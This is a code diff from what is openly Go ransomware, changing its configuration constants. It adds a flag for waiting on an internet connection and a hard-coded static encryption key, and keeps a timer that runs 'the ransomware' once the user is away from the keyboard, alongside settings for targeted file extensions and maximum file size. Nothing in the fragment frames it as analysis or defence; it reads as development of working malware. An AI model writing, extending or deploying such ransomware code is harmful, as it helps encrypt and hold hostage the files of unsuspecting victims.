@@ -10,9 +10,12 @@ const maxFileSize = 1024 * 1024 * 1024 * 1024
 // UseDict The dict is faster if you have ~70 or more extensions
 const UseDict = true
 
-//time to wait until the user is considered afk
-const WaitAfk = time.Second * 5 //for debugging purposes
+//if this is false it will use the static key below and won't wait for the user to be online
+const WaitForInternet = true
+const StaticKey = "12345678901234567890123456789012"
 
+//time to wait until the user is considered afk and the ransomware is ran
+const WaitAfk = time.Second * 5 //for debugging purposes
 //const WaitAfk = time.Minute * 10
 
 // Change extensions in either extensionsSlice or extensionDict depending on which one you use
